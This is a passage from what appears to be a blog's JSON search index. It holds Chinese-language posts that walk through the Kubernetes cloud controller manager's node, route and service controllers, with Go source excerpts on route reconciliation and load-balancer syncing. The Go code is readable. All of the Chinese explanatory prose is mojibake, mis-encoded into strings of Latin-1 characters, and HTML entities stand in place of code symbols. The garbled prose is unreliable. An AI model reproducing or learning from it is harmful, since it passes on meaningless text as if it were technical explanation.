%v&quot;, node.Name, err) continue &#125; if exists &#123; // Continue checking the remaining nodes since the current one is fine. continue &#125; glog.V(2).Infof(&quot;Deleting node since it is no longer present in cloud provider: %s&quot;, node.Name) ref := &amp;v1.ObjectReference&#123; Kind: &quot;Node&quot;, Name: node.Name, UID: types.UID(node.UID), Namespace: &quot;&quot;, &#125; glog.V(2).Infof(&quot;Recording %s event message for node %s&quot;, &quot;DeletingNode&quot;, node.Name) cnc.recorder.Eventf(ref, v1.EventTypeNormal, fmt.Sprintf(&quot;Deleting Node %v because it&#x27;s not present according to cloud provider&quot;, node.Name), &quot;Node %s event: %s&quot;, node.Name, &quot;DeletingNode&quot;) go func(nodeName string) &#123; defer utilruntime.HandleCrash() if err := cnc.kubeClient.CoreV1().Nodes().Delete(nodeName, nil); err != nil &#123; glog.Errorf(&quot;unable to delete node %q: %v&quot;, nodeName, err) &#125; &#125;(node.Name) &#125; else &#123; // if taint exist remove taint err = controller.RemoveTaintOffNode(cnc.kubeClient, node.Name, node, controller.ShutdownTaint) if err != nil &#123; glog.Errorf(&quot;Error patching node taints: %v&quot;, err) &#125; &#125; &#125;\t&#125;&#125;","tags":["k8s"]},{"title":"cloud provider route controller","path":"/2019/04/02/cloud-provider-route-controller/","content":"â€‹\tå½“ pod çš„ CIDR å’Œæ‰€å±çš„ node ä¸å±äºåŒä¸€ä¸ª cidr ä¸Šæ—¶å€™ï¼Œåœ¨éƒ¨åˆ†äº‘ä¸Šå°±ä¼šæœ‰ pod å’Œ node ç½‘ç»œäº’é€šçš„é—®é¢˜ï¼Œè€Œ route controller å°±æ˜¯è¢«è®¾è®¡ç”¨æ¥åˆ›å»ºè·¯ç”±è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ¡ˆã€‚ â€‹\tå¦‚æœè®¡åˆ’è®© k8s å¯åŠ¨çš„ pod ä»æŒ‡å®šçš„ cidr ä¸­åˆ†é… ip å¸¸è§çš„æ–¹å¼æ˜¯é€šè¿‡æŒ‡å®š KCM çš„å¯åŠ¨å‚æ•°cluster-cidræ¥æŒ‡å®š POD CIDRï¼Œservice ä¹Ÿå¯ä»¥é€šè¿‡ KCM çš„service-cluster-ip-rangeå‚æ•°æŒ‡å®š CIDRã€‚ â€‹\tcloud provider å¯åŠ¨æ—¶å€™é€šè¿‡åˆ¤æ–­ AllocateNodeCIDRs ä¸ ConfigureCloudRoutes çš„ä¸é€»è¾‘æ¥åˆ¤æ–­ k8s çš„ pod æ˜¯å¦ä»æŒ‡å®šçš„ cidr ä¸­åˆ†é… IPï¼ŒAllocateNodeCIDRs å­—æ®µçš„æ„ä¹‰æ˜¯ AllocateNodeCIDRs enables CIDRs for Pods to be allocated and, if ConfigureCloudRoutes is true, to be set on the cloud provider.,ConfigureCloudRoutes å­—æ®µçš„æ„ä¹‰æ˜¯configureCloudRoutes enables CIDRs allocated with allocateNodeCIDRs to be configured on the cloud provider. 123456789101112131415161718192021// startControllers starts the cloud specific controller loops.func startControllers(c *cloudcontrollerconfig.CompletedConfig, stop &lt;-chan struct&#123;&#125;, cloud cloudprovider.Interface) error &#123;...\t// If CIDRs should be allocated for pods and set on the CloudProvider, then start the route controller\tif c.ComponentConfig.KubeCloudShared.AllocateNodeCIDRs &amp;&amp; c.ComponentConfig.KubeCloudShared.ConfigureCloudRoutes &#123; // è¿™é‡Œåˆ¤æ–­æ˜¯å¦å®ç°äº† cloud provider route ç›¸å…³æ¥å£ if routes, ok := cloud.Routes(); !ok &#123; glog.Warning(&quot;configure-cloud-routes is set, but cloud provider does not support routes. Will not configure cloud provider routes.&quot;) &#125; else &#123; var clusterCIDR *net.IPNet if len(strings.TrimSpace(c.ComponentConfig.KubeCloudShared.ClusterCIDR)) != 0 &#123; _, clusterCIDR, err = net.ParseCIDR(c.ComponentConfig.KubeCloudShared.ClusterCIDR) if err != nil &#123; glog.Warningf(&quot;Unsuccessful parsing of cluster CIDR %v: %v&quot;, c.ComponentConfig.KubeCloudShared.ClusterCIDR, err) &#125; &#125; routeController := routecontroller.New(routes, client(&quot;route-controller&quot;), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName, clusterCIDR) go routeController.Run(stop, c.ComponentConfig.KubeCloudShared.RouteReconciliationPeriod.Duration) ...&#125; â€‹\tè¿™ä¸ª Run å‡½æ•°ä¿æŒç€ cloud provider è¿è¡Œ controller çš„ä¸€è´¯é£æ ¼ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«è¦æ³¨æ„çš„åœ°æ–¹ã€‚ 123456789101112131415func (rc *RouteController) Run(stopCh &lt;-chan struct&#123;&#125;, syncPeriod time.Duration) &#123;... // TODO: If we do just the full Resync every 5 minutes (default value) // that means that we may wait up to 5 minutes before even starting // creating a route for it. This is bad. // We should have a watch on node and if we observe a new node (with CIDR?) // trigger reconciliation for that node. go wait.NonSlidingUntil(func() &#123; if err := rc.reconcileNodeRoutes(); err != nil &#123; glog.Errorf(&quot;Couldn&#x27;t reconcile node routes: %v&quot;, err) &#125; &#125;, syncPeriod, stopCh)...&#125; â€‹\tè¿™é‡Œåœ°æ–¹çš„å®ç°å”¯ä¸€å€¼å¾—è¯´é“çš„æ˜¯reconcileçš„å‡½æ•°å‘½åï¼Œåœ¨ k8s çš„ controller ä¸­è®²ç°å®ä¸–ç•Œå˜æˆå£°æ˜å¼ä¸­çš„è¿‡ç¨‹ç§°ä¸ºreconcileã€‚ 12345func (rc *RouteController) reconcileNodeRoutes() error &#123; routeList, err := rc.routes.ListRoutes(context.TODO(), rc.clusterName)... return rc.reconcile(nodes, routeList)&#125; â€‹\tè¿™ä¸ªæ˜¯å®é™… reconcile çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æ‰¾åˆ°ç°å®ä¸–ç•Œå’ŒæœŸæœ›ä¸–ç•Œå·®è·ï¼Œç„¶åé€šè¿‡ cloud proivder routeæ‰€æä¾›çš„æ¥å£æ“ä½œäº‘ä¸Šçš„routeèµ„æºè¿›è¡Œæ·»åŠ &#x2F;åˆ é™¤æ“ä½œå°†å…¶å˜æˆæœŸæœ›çš„æ¨¡æ ·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576func (rc *RouteController) reconcile(nodes []*v1.Node, routes []*cloudprovider.Route) error &#123; // nodeCIDRs maps nodeName-&gt;nodeCIDR nodeCIDRs := make(map[types.NodeName]string) // routeMap maps routeTargetNode-&gt;route routeMap := make(map[types.NodeName]*cloudprovider.Route) for _, route := range routes &#123; if route.TargetNode != &quot;&quot; &#123; routeMap[route.TargetNode] = route &#125; &#125; wg := sync.WaitGroup&#123;&#125; rateLimiter := make(chan struct&#123;&#125;, maxConcurrentRouteCreations) for _, node := range nodes &#123; // Skip if the node hasn&#x27;t been assigned a CIDR yet. if node.Spec.PodCIDR == &quot;&quot; &#123; continue &#125; nodeName := types.NodeName(node.Name) // Check if we have a route for this node w/ the correct CIDR. r := routeMap[nodeName] if r == nil || r.DestinationCIDR != node.Spec.PodCIDR &#123; // If not, create the route. route := &amp;cloudprovider.Route&#123; TargetNode: nodeName, DestinationCIDR: node.Spec.PodCIDR, &#125; nameHint := string(node.UID) wg.Add(1) go func(nodeName types.NodeName, nameHint string, route *cloudprovider.Route) &#123; defer wg.Done() err := clientretry.RetryOnConflict(updateNetworkConditionBackoff, func() error &#123; startTime := time.Now() // Ensure that we don&#x27;t have more than maxConcurrentRouteCreations // CreateRoute calls in flight. rateLimiter &lt;- struct&#123;&#125;&#123;&#125; glog.Infof(&quot;Creating route for node %s %s with hint %s, throttled %v&quot;, nodeName, route.DestinationCIDR, nameHint, time.Since(startTime)) err := rc.routes.CreateRoute(context.TODO(), rc.clusterName, nameHint, route) &lt;-rateLimiter rc.updateNetworkingCondition(nodeName, err == nil) if err != nil &#123; msg := fmt.Sprintf(&quot;Could not create route %s %s for node %s after %v: %v&quot;, nameHint, route.DestinationCIDR, nodeName, time.Since(startTime), err) if rc.recorder != nil &#123; rc.recorder.Eventf( &amp;v1.ObjectReference&#123; Kind: &quot;Node&quot;, Name: string(nodeName), UID: types.UID(nodeName), Namespace: &quot;&quot;, &#125;, v1.EventTypeWarning, &quot;FailedToCreateRoute&quot;, msg) &#125; glog.V(4).Infof(msg) return err &#125; glog.Infof(&quot;Created route for node %s %s with hint %s after %v&quot;, nodeName, route.DestinationCIDR, nameHint, time.Now().Sub(startTime)) return nil &#125;) if err != nil &#123; glog.Errorf(&quot;Could not create route %s %s for node %s: %v&quot;, nameHint, route.DestinationCIDR, nodeName, err) &#125; &#125;(nodeName, nameHint, route) &#125; else &#123; // Update condition only if it doesn&#x27;t reflect the current state. _, condition := v1node.GetNodeCondition(&amp;node.Status, v1.NodeNetworkUnavailable) if condition == nil || condition.Status != v1.ConditionFalse &#123; rc.updateNetworkingCondition(types.NodeName(node.Name), true) &#125; &#125; nodeCIDRs[nodeName] = node.Spec.PodCIDR &#125;... wg.Wait() return nil&#125; â€‹\tç›®å‰è…¾è®¯äº‘ TKEçš„ global router ç½‘ç»œæ¨¡å¼å°±æ˜¯ç¬¦åˆä¸Šè¿°æè¿°ï¼Œåœ¨ global router æ¨¡å¼ä¸‹ route controller ä¼šåœ¨èŠ‚ç‚¹å¯åŠ¨çš„æ—¶å€™å»äº‘ä¸Šæ³¨å†Œè·¯ç”±ï¼Œä¸‹å›¾ä¸­èŠ‚ç‚¹ 172.0.0.1 ä¸Š kubelet ä¸ŠæŠ¥ ready æ—¶å€™ route controller ä¼šå» vpc ä¸­æ³¨å†Œ 10.0.0.0&#x2F;24 çš„è·¯ç”±ï¼Œå¹¶ä¸” 172.0.0.1 ä¸Šçš„ pod éƒ½æ˜¯ä» 10.0.0.0&#x2F;24 çš„ cidr åˆ†é… IP çš„ï¼Œè¿™æ ·å°±å®ç°äº†å’Œ vpc çš„äº’é€šã€‚ image-20190423113516302","tags":["k8s"]},{"title":"cloud provider Service Controller","path":"/2019/04/01/cloud-provider-svc-controller/","content":"â€‹\tservice controller è´Ÿè´£è§‚å¯Ÿ k8s ä¸­ service èµ„æºçš„åˆ›å»ºï¼Œæ›´æ–°å’Œåˆ é™¤äº‹ä»¶ã€‚å¹¶åŸºäºå½“å‰ k8s ä¸­çš„ service çŠ¶æ€å»äº‘ä¸Šé…ç½®è´Ÿè½½å‡è¡¡ï¼Œä¿è¯äº‘ä¸Šçš„è´Ÿè½½å‡ä¸ serivce èµ„æºæè¿°ç›¸ä¸€è‡´ã€‚ â€‹\tservice controller åœ¨ cloud contorller ä¸­çš„ä¸€ä¸ªæ¨¡å—éš cloud controller å¯åŠ¨ï¼Œå¯ä»¥é€šè¿‡å¯åŠ¨ new service controller å‚æ•°å¯ä»¥è§‚æµ‹åˆ°ï¼Œservice controller æ˜¯é€šè¿‡è§‚å¯Ÿ service å’Œ node èµ„æºæ¥å·¥ä½œçš„ã€‚ 1234567891011121314// Start the service controllerserviceController, err := servicecontroller.New( cloud, client(&quot;service-controller&quot;), c.SharedInformers.Core().V1().Services(), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName,)if err != nil &#123; glog.Errorf(&quot;Failed to start service controller: %v&quot;, err)&#125; else &#123; go serviceController.Run(stop, int(c.ComponentConfig.ServiceController.ConcurrentServiceSyncs)) time.Sleep(wait.Jitter(c.ComponentConfig.Generic.ControllerStartInterval.Duration, ControllerStartJitter))&#125; â€‹\tnew å‡½æ•°çš„å®ç°å¦‚ä¸‹ï¼Œæ ¸å¿ƒæ˜¯æµç¨‹æ˜¯é€šè¿‡ list&#x2F;watch æœºåˆ¶æ¥è§‚æµ‹ service çš„ eventï¼Œç„¶åè§¦å‘ enqueue çš„å‡½æ•°ï¼Œå†é€šè¿‡ sync woker ä» wrok queue ä¸­å–å‡º item å¤„ç†äº‘ä¸Š lb çš„ç»‘å®šé€»è¾‘ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// New returns a new service controller to keep cloud provider service resources// (like load balancers) in sync with the registry.func New( cloud cloudprovider.Interface, kubeClient clientset.Interface, serviceInformer coreinformers.ServiceInformer, nodeInformer coreinformers.NodeInformer, clusterName string,) (*ServiceController, error) &#123; broadcaster := record.NewBroadcaster() broadcaster.StartLogging(glog.Infof) broadcaster.StartRecordingToSink(&amp;v1core.EventSinkImpl&#123;Interface: kubeClient.CoreV1().Events(&quot;&quot;)&#125;) recorder := broadcaster.NewRecorder(scheme.Scheme, v1.EventSource&#123;Component: &quot;service-controller&quot;&#125;) if kubeClient != nil &amp;&amp; kubeClient.CoreV1().RESTClient().GetRateLimiter() != nil &#123; if err := metrics.RegisterMetricAndTrackRateLimiterUsage(&quot;service_controller&quot;, kubeClient.CoreV1().RESTClient().GetRateLimiter()); err != nil &#123; return nil, err &#125; &#125; s := &amp;ServiceController&#123; cloud: cloud, knownHosts: []*v1.Node&#123;&#125;, kubeClient: kubeClient, clusterName: clusterName, cache: &amp;serviceCache&#123;serviceMap: make(map[string]*cachedService)&#125;, eventBroadcaster: broadcaster, eventRecorder: recorder, nodeLister: nodeInformer.Lister(), nodeListerSynced: nodeInformer.Informer().HasSynced, queue: workqueue.NewNamedRateLimitingQueue(workqueue.NewItemExponentialFailureRateLimiter(minRetryDelay, maxRetryDelay), &quot;service&quot;), &#125; serviceInformer.Informer().AddEventHandlerWithResyncPeriod( cache.ResourceEventHandlerFuncs&#123; AddFunc: s.enqueueService, UpdateFunc: func(old, cur interface&#123;&#125;) &#123; oldSvc, ok1 := old.(*v1.Service) curSvc, ok2 := cur.(*v1.Service) if ok1 &amp;&amp; ok2 &amp;&amp; s.needsUpdate(oldSvc, curSvc) &#123; s.enqueueService(cur) &#125; &#125;, DeleteFunc: s.enqueueService, &#125;, serviceSyncPeriod, ) s.serviceLister = serviceInformer.Lister() s.serviceListerSynced = serviceInformer.Informer().HasSynced if err := s.init(); err != nil &#123; return nil, err &#125; return s, nil&#125; â€‹\tservice é€šè¿‡å½¢å¦‚ namespace+serivce åå­—çš„ key æ”¾å…¥ work queueï¼Œè€Œ syncService å‡½æ•°æ ¹æ® key å–å‡º service è¿›è¡Œå®é™…çš„å¤„ç†æ“ä½œï¼Œå¦‚æœæ“ä½œå®Œæˆè¿‡åä» work queue ä¸­è°ƒç”¨ queue.done(key) ç§»é™¤æ‰ã€‚ 1234567891011121314151617func (s *ServiceController) processNextWorkItem() bool &#123; key, quit := s.queue.Get() if quit &#123; return false &#125; defer s.queue.Done(key) err := s.syncService(key.(string)) if err == nil &#123; s.queue.Forget(key) return true &#125; runtime.HandleError(fmt.Errorf(&quot;error processing service %v (will retry): %v&quot;, key, err)) s.queue.AddRateLimited(key) return true&#125; â€‹\tä¹‹æ‰€ä»¥ service è¦ä¸€ä¸ªé¢å¤–çš„ work queue æœ‰åŸå› çš„ï¼Œå…¶ä¸€æ˜¯å› ä¸ºäº‘ä¸Š lb çš„å®é™…ç»‘å®šè§£ç»‘æ“ä½œç›¸å¯¹äºå•çº¯çš„ serivce å£°æ˜è¦æ…¢å¾ˆå¤šï¼Œå…¶äºŒæ˜¯å½“ service ä» k8s ä¸­åˆ é™¤çš„æ—¶å€™å°±çœŸçš„è¢«ä» etcd ä¸­ç§»é™¤äº†ï¼Œè¿™ä¸ªæ—¶å€™ä»ç¼“å­˜é‡Œé¢æ‰¾ä¸ªåˆ é™¤å¯¹åº”å…¬ç½‘ lb çš„å…³é”®å‚æ•°ã€‚ â€‹\tè¿™ä¸ªæ‰æ˜¯ service controller çš„æ ¸å¿ƒé€»è¾‘ï¼Œè¿™é‡Œä¼šç¡®è®¤ service æ˜¯åˆ é™¤è¿˜æ˜¯æ›´æ–°ã€‚ 12345678910111213141516171819202122232425262728293031// syncService will sync the Service with the given key if it has had its expectations fulfilled,// meaning it did not expect to see any more of its pods created or deleted. This function is not meant to be// invoked concurrently with the same key.func (s *ServiceController) syncService(key string) error &#123; startTime := time.Now() var cachedService *cachedService defer func() &#123; glog.V(4).Infof(&quot;Finished syncing service %q (%v)&quot;, key, time.Since(startTime)) &#125;() namespace, name, err := cache.SplitMetaNamespaceKey(key) if err != nil &#123; return err &#125; // service holds the latest service info from apiserver service, err := s.serviceLister.Services(namespace).Get(name) switch &#123; case errors.IsNotFound(err): // service absence in store means watcher caught the deletion, ensure LB info is cleaned glog.Infof(&quot;Service has been deleted %v. Attempting to cleanup load balancer resources&quot;, key) err = s.processServiceDeletion(key) case err != nil: glog.Infof(&quot;Unable to retrieve service %v from store: %v&quot;, key, err) default: cachedService = s.cache.getOrCreate(key) err = s.processServiceUpdate(cachedService, service, key) &#125; return err&#125; â€‹\tçœ‹ä¸€ä¸‹å¤„ç† service update çš„æ ¸å¿ƒé€»è¾‘ï¼Œ 1234567891011121314151617181920212223242526272829303132333435// processServiceUpdate operates loadbalancers for the incoming service accordingly.// Returns an error if processing the service update failed.func (s *ServiceController) processServiceUpdate(cachedService *cachedService, service *v1.Service, key string) error &#123; if cachedService.state != nil &#123; // å¦‚æœæ˜¯åŒåå­—ä½†æ˜¯ UID ä¸ä¸€æ · // ä¼šè¢«ç¡®è®¤æ˜¯ä¸åŒçš„ serivice åˆ™è¿™ä¸ª lb ä¼šè¢«åˆ é™¤ã€‚ if cachedService.state.UID != service.UID &#123; err := s.processLoadBalancerDelete(cachedService, key) if err != nil &#123; return err &#125; &#125; &#125; // cache the service, we need the info for service deletion cachedService.state = service err := s.createLoadBalancerIfNeeded(key, service) if err != nil &#123; eventType := &quot;CreatingLoadBalancerFailed&quot; message := &quot;Error creating load balancer (will retry): &quot; if !wantsLoadBalancer(service) &#123; eventType = &quot;CleanupLoadBalancerFailed&quot; message = &quot;Error cleaning up load balancer (will retry): &quot; &#125; message += err.Error() s.eventRecorder.Event(service, v1.EventTypeWarning, eventType, message) return err &#125; // Always update the cache upon success. // NOTE: Since we update the cached service if and only if we successfully // processed it, a cached service being nil implies that it hasn&#x27;t yet // been successfully processed. s.cache.set(key, cachedService) return nil&#125; â€‹\tæ ¹æ®å®é™…æƒ…å†µåˆ¤æ–­æ˜¯æ›´æ–°ï¼Œè¿˜æ˜¯åˆ›å»ºäº‘ä¸Š lb èµ„æºã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// createLoadBalancerIfNeeded ensures that service&#x27;s status is synced up with loadbalancer// i.e. creates loadbalancer for service if requested and deletes loadbalancer if the service// doesn&#x27;t want a loadbalancer no more. Returns whatever error occurred.func (s *ServiceController) createLoadBalancerIfNeeded(key string, service *v1.Service) error &#123; // Note: It is safe to just call EnsureLoadBalancer. But, on some clouds that requires a delete &amp; create, // which may involve service interruption. Also, we would like user-friendly events. // Save the state so we can avoid a write if it doesn&#x27;t change previousState := v1helper.LoadBalancerStatusDeepCopy(&amp;service.Status.LoadBalancer) var newState *v1.LoadBalancerStatus var err error\t// é’ˆå¯¹ Type å˜æ›´ï¼Œè¦åšäº‘çš„ lb æ¸…ç† if !wantsLoadBalancer(service) &#123; _, exists, err := s.balancer.GetLoadBalancer(context.TODO(), s.clusterName, service) if err != nil &#123; return fmt.Errorf(&quot;error getting LB for service %s: %v&quot;, key, err) &#125; if exists &#123; glog.Infof(&quot;Deleting existing load balancer for service %s that no longer needs a load balancer.&quot;, key) s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;DeletingLoadBalancer&quot;, &quot;Deleting load balancer&quot;) if err := s.balancer.EnsureLoadBalancerDeleted(context.TODO(), s.clusterName, service); err != nil &#123; return err &#125; s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;DeletedLoadBalancer&quot;, &quot;Deleted load balancer&quot;) &#125; newState = &amp;v1.LoadBalancerStatus&#123;&#125; &#125; else &#123; glog.V(2).Infof(&quot;Ensuring LB for service %s&quot;, key) // TODO: We could do a dry-run here if wanted to avoid the spurious cloud-calls &amp; events when we restart s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;EnsuringLoadBalancer&quot;, &quot;Ensuring load balancer&quot;)\t// è¿™ä¸ªåœ°æ–¹æ˜¯ service æ›´æ–°æ›´æ–°çš„æ ¸å¿ƒé€»è¾‘ newState, err = s.ensureLoadBalancer(service) if err != nil &#123; return fmt.Errorf(&quot;failed to ensure load balancer for service %s: %v&quot;, key, err) &#125; s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;EnsuredLoadBalancer&quot;, &quot;Ensured load balancer&quot;) &#125; // Write the state if changed // TODO: Be careful here ... what if there were other changes to the service? if !v1helper.LoadBalancerStatusEqual(previousState, newState) &#123; // Make a copy so we don&#x27;t mutate the shared informer cache service = service.DeepCopy() // Update the status on the copy service.Status.LoadBalancer = *newState if err := s.persistUpdate(service); err != nil &#123; // TODO: This logic needs to be revisited. We might want to retry on all the errors, not just conflicts. if errors.IsConflict(err) &#123; return fmt.Errorf(&quot;not persisting update to service &#x27;%s/%s&#x27; that has been changed since we received it: %v&quot;, service.Namespace, service.Name, err) &#125; runtime.HandleError(fmt.Errorf(&quot;failed to persist service %q updated status to apiserver, even after retries. Giving up: %v&quot;, key, err)) return nil &#125; &#125; else &#123; glog.V(2).Infof(&quot;Not persisting unchanged LoadBalancerStatus for service %s to registry.&quot;, key) &#125; return nil&#125; 12345func (s *ServiceController) ensureLoadBalancer(service *v1.Service) (*v1.LoadBalancerStatus, error) &#123;... // åŸºæœ¬å°±æ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•° return s.balancer.EnsureLoadBalancer(context.TODO(), s.clusterName, service, nodes)&#125; â€‹\tä¸‹é¢æ˜¯æŠ½è±¡ç»™ cloud provider å®ç°çš„æ¥å£ï¼Œç”± serivce controller æ¥ç»Ÿä¸€è°ƒç”¨ï¼ŒEnsureLoadBalancer æ˜¯æœ€æ ¸å¿ƒçš„å‡½æ•°ï¼Œä¸€èˆ¬äº‘å‚å•†çš„å®ç°æ–¹å¼å°±æ˜¯å°†ä»–ä»¬çš„å…¬ç½‘ LB äº§å“å’Œ k8s çš„ LoadBalancer type çš„ service ç»“åˆèµ·æ¥ã€‚ 12345678910111213141516171819202122232425262728293031// LoadBalancer is an abstract, pluggable interface for load balancers.type LoadBalancer interface &#123; // TODO: Break this up into different interfaces (LB, etc) when we have more than one type of service // GetLoadBalancer returns whether the specified load balancer exists, and // if so, what its status is. // Implementations must treat the *v1.Service parameter as read-only and not modify it. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager GetLoadBalancer(ctx context.Context, clusterName string, service *v1.Service) (status *v1.LoadBalancerStatus, exists bool, err error) // GetLoadBalancerName returns the name of the load balancer. Implementations must treat the // *v1.Service parameter as read-only and not modify it. GetLoadBalancerName(ctx context.Context, clusterName string, service *v1.Service) string // EnsureLoadBalancer creates a new load balancer &#x27;name&#x27;, or updates the existing one. Returns the status of the balancer // Implementations must treat the *v1.Service and *v1.Node // parameters as read-only and not modify them. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager EnsureLoadBalancer(ctx context.Context, clusterName string, service *v1.Service, nodes []*v1.Node) (*v1.LoadBalancerStatus, error) // UpdateLoadBalancer updates hosts under the specified load balancer. // Implementations must treat the *v1.Service and *v1.Node // parameters as read-only and not modify them. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager UpdateLoadBalancer(ctx context.Context, clusterName string, service *v1.Service, nodes []*v1.Node) error // EnsureLoadBalancerDeleted deletes the specified load balancer if it // exists, returning nil if the load balancer specified either didn&#x27;t exist or // was successfully deleted. // This construction is useful because many cloud providers&#x27; load balancers // have multiple underlying components, meaning a Get could say that the LB // doesn&#x27;t exist even if some part of it is still laying around. // Implementations must treat the *v1.Service parameter as read-only and not modify it. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager EnsureLoadBalancerDeleted(ctx context.Context, clusterName string, service *v1.Service) error&#125; â€‹\tå¦‚æœå®¢æˆ·åœ¨ k8s ä¸­åˆ›å»º LoadBalancer type çš„ serviceï¼Œcloud proivder çš„ EnsureLoadBalancer å¸¸è§å®ç°æ–¹å¼æ˜¯ï¼Œè°ƒç”¨äº‘ä¸Š LB ç›¸å…³æ¥å£å°† LB åŠå…¶å¿…è¦çš„ä¾èµ–èµ„æºåˆ›å»ºå‡ºæ¥ï¼Œå…¶ LB å¯¹åº”çš„åç«¯æ˜¯ serivce æ‰€å±çš„é›†ç¾¤å†…çš„ k8s nodeå…¨éƒ¨èŠ‚ç‚¹ï¼Œéƒ¨åˆ†èŠ‚ç‚¹ä¹Ÿå¯ä»¥çš„åŸå› æ˜¯å› ä¸ºæ”¶åˆ°æµé‡çš„éƒ¨åˆ†èŠ‚ç‚¹ä¼šé€šè¿‡ kube-proxy çš„è§„åˆ™å°†æµé‡äºŒæ¬¡è½¬å‘å…·ä½“ç»†èŠ‚ã€‚â€‹\tå½“ lb åˆ›å»ºå®Œæˆï¼Œåç«¯ç»‘å®šæˆåŠŸåï¼Œå®¢æˆ·å°±å¯ä»¥é€šè¿‡è®¿é—®å…¬ç½‘ç±»å‹çš„ LB çš„ VIP æ¥è®¿é—® Pod ä¸­çš„ä¸šåŠ¡äº†ã€‚è¿™ä¸ªæ—¶å€™æµé‡æ˜¯å…ˆåˆ°äº‘å‚å•†çš„å…¬ç½‘ç½‘å…³ï¼Œç„¶åæµé‡é€šè¿‡ LB åˆ°äº‘å‚å•†æä¾›ç»™ k8s çš„ node ä¸Šï¼Œæœ€åå†ç”± kube-proxy é€šè¿‡ watch endpoint äº§ç”Ÿçš„è½¬å‘è§„åˆ™è®²æµé‡è¿åˆ° pod ä¸­ã€‚","tags":["k8s"]},{"title":"cloud provider summary","path":"/2019/03/29/cloud-provider/","content":"â€‹\tcloud controller manager æ˜¯å¯æ’æ‹”çš„ï¼Œå®ƒè¿è¡Œæ–°çš„ cloud provider ç®€å•æ–¹ä¾¿çš„ä¸ Kubernetes é›†æˆã€‚ â€‹\tcloud provider å¯åŠ¨ä» new ä¸€ä¸ª cloud manager command å¼€å§‹ 12345func main() &#123;... command := app.NewCloudControllerManagerCommand()...&#125; â€‹\tRun å‡½æ•°æ˜¯ k8s contrller manager å®šä¹‰çš„å…³é”®å…¥å£ï¼Œåœ¨ NewCloudControllerManagerCommand ä¸­è¢«è°ƒç”¨ï¼Œå‚æ•°æ˜¯ä¸€ä¸ª CompletedConfigï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ stopChã€‚ 12345678// NewCloudControllerManagerCommand creates a *cobra.Command object with default parametersfunc NewCloudControllerManagerCommand() *cobra.Command &#123; s, err := options.NewCloudControllerManagerOptions()... if err := Run(c.Complete(), wait.NeverStop); err != nil &#123;... return cmd&#125; â€‹\tRun å‡½æ•°çš„å®ç°ï¼Œä¸»è¦æ˜¯åšäº› controller å¯åŠ¨å‰çš„å‡†å¤‡å·¥ä½œï¼Œæ¯”å¦‚é”çš„è·å–ï¼Œå®é™…åš controller å¯åŠ¨çš„æ˜¯è°ƒç”¨ startControllersã€‚ 123456789101112131415161718192021222324// Run runs the ExternalCMServer. This should never exit.func Run(c *cloudcontrollerconfig.CompletedConfig, stopCh &lt;-chan struct&#123;&#125;) error &#123;...\trun := func(ctx context.Context) &#123; if err := startControllers(c, ctx.Done(), cloud); err != nil &#123; glog.Fatalf(&quot;error running controllers: %v&quot;, err) &#125;\t&#125;...\t// Lock required for leader election\trl, err := resourcelock.New(c.ComponentConfig.Generic.LeaderElection.ResourceLock, &quot;kube-system&quot;, &quot;cloud-controller-manager&quot;, c.LeaderElectionClient.CoreV1(), resourcelock.ResourceLockConfig&#123; Identity: id, EventRecorder: c.EventRecorder, &#125;)\tif err != nil &#123; glog.Fatalf(&quot;error creating lock: %v&quot;, err)\t&#125;....&#125; åœ¨ startcontroller ä¸­å®é™…å¯åŠ¨çš„ controller å¦‚ä¸‹ï¼šCloudNodeControllerï¼ŒPersistentVolumeLabelControllerï¼ŒRouteControllerï¼ŒserviceControllerã€‚ CloudNodeController è´Ÿè´£åˆå§‹åŒ– k8s ä¸­ node ä¸äº‘ä¸Šçš„ä¿¡æ¯ã€‚ PersistentVolumeLabelController è´Ÿè´£ç»™ PV æ‰“ Labelï¼Œä¿è¯å­˜å‚¨ä¸ä¼šè¢«è·¨åŒºæŒ‚è½½ã€‚ RouteController ç”¨æ¥åˆ›å»ºè·¯ç”±è§£å†³ä¸é€š node ä¸Š pod çš„äº’é€šé—®é¢˜ã€‚ serviceController ç”¨æ¥åˆ›å»ºäº‘å‚å•†çš„è´Ÿè½½å‡è¡¡ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// startControllers starts the cloud specific controller loops.func startControllers(c *cloudcontrollerconfig.CompletedConfig, stop &lt;-chan struct&#123;&#125;, cloud cloudprovider.Interface) error &#123;...\tif cloud != nil &#123; // Initialize the cloud provider with a reference to the clientBuilder cloud.Initialize(c.ClientBuilder)\t&#125;\t// Start the CloudNodeController\tnodeController := cloudcontrollers.NewCloudNodeController( c.SharedInformers.Core().V1().Nodes(), client(&quot;cloud-node-controller&quot;), cloud, c.ComponentConfig.KubeCloudShared.NodeMonitorPeriod.Duration, c.ComponentConfig.NodeStatusUpdateFrequency.Duration)\tnodeController.Run(stop)...\t// Start the PersistentVolumeLabelController\tpvlController := cloudcontrollers.NewPersistentVolumeLabelController(client(&quot;pvl-controller&quot;), cloud)\tgo pvlController.Run(5, stop)...\t// Start the service controller\tserviceController, err := servicecontroller.New( cloud, client(&quot;service-controller&quot;), c.SharedInformers.Core().V1().Services(), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName,\t)\tif err != nil &#123; glog.Errorf(&quot;Failed to start service controller: %v&quot;, err)\t&#125; else &#123; go serviceController.Run(stop, 